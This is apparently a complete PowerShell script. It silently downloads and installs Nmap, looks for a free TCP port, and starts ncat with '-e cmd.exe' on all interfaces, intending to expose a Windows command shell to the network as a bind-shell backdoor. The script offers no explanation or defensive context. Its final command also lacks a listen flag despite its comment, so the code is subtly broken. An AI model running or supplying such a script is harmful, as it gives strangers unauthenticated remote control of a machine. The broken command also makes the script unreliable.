# Create temp directory if missing
if (!(Test-Path -Path "C:\temp")) {
    New-Item -Path "C:\temp" -ItemType Directory | Out-Null
}

# Download Nmap installer
$installerPath = "C:\temp\nmap-setup.exe"
Invoke-WebRequest "https://nmap.org/dist/nmap-latest-setup.exe" -OutFile $installerPath

# Install Nmap silently
Start-Process $installerPath -ArgumentList "/S" -Wait

# Change to Nmap directory
Set-Location "C:\Program Files (x86)\Nmap"

# Function to find an open port starting from 87
function Get-OpenPort {
    param([int]$startPort = 87, [int]$maxPort = 65535)

    for ($port = $startPort; $port -le $maxPort; $port++) {
        try {
            $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
            $listener.Start()
            $listener.Stop()
            return $port
        } catch {
            # Port in use, try next
        }
    }
    throw "No open ports found between $startPort and $maxPort"
}

$openPort = Get-OpenPort

# Start ncat listener on available port
& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 $openPort -e cmd.exe
